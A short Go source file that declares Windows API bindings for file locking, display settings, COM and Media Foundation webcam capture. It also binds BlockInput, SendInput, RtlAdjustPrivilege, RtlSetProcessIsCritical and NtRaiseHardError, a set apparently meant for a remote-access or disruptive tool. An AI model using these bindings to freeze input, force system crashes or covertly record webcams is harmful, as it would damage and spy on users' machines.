package store

import "syscall"

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	user32   = syscall.NewLazyDLL("user32.dll")
	ole32    = syscall.NewLazyDLL("ole32.dll")
	shell32  = syscall.NewLazyDLL("shell32.dll")
	ntdll    = syscall.NewLazyDLL("ntdll.dll")
	mfplat   = syscall.NewLazyDLL("mfplat.dll")
	mf       = syscall.NewLazyDLL("mf.dll")
	mfrw     = syscall.NewLazyDLL("mfreadwrite.dll")
)

var (
	LockFile   = kernel32.NewProc("LockFileEx")
	UnlockFile = kernel32.NewProc("UnlockFileEx")

	SystemInfo    = user32.NewProc("SystemParametersInfoW")
	EnumDisplay   = user32.NewProc("EnumDisplaySettingsA")
	ChangeDisplay = user32.NewProc("ChangeDisplaySettingsA")
	MessageBox    = user32.NewProc("MessageBoxW")
	BlockInput    = user32.NewProc("BlockInput")
	SendInput     = user32.NewProc("SendInput")

	InitializeCOM   = ole32.NewProc("CoInitialize")
	UninitializeCOM = ole32.NewProc("CoUninitialize")
	CreateCOM       = ole32.NewProc("CoCreateInstance")

	AmIAdmin = shell32.NewProc("IsUserAnAdmin")

	AdjustPrivilege = ntdll.NewProc("RtlAdjustPrivilege")
	SetCritical     = ntdll.NewProc("RtlSetProcessIsCritical")
	RaiseHardError  = ntdll.NewProc("NtRaiseHardError")

	MediaStartup          = mfplat.NewProc("MFStartup")
	MediaShutdown         = mfplat.NewProc("MFShutdown")
	MediaCreateAttributes = mfplat.NewProc("MFCreateAttributes")
	MediaCreateType       = mfplat.NewProc("MFCreateMediaType")

	MediaEnumerateDevices = mf.NewProc("MFEnumDeviceSources")

	MediaCreateReader = mfrw.NewProc("MFCreateSourceReaderFromMediaSource")
)
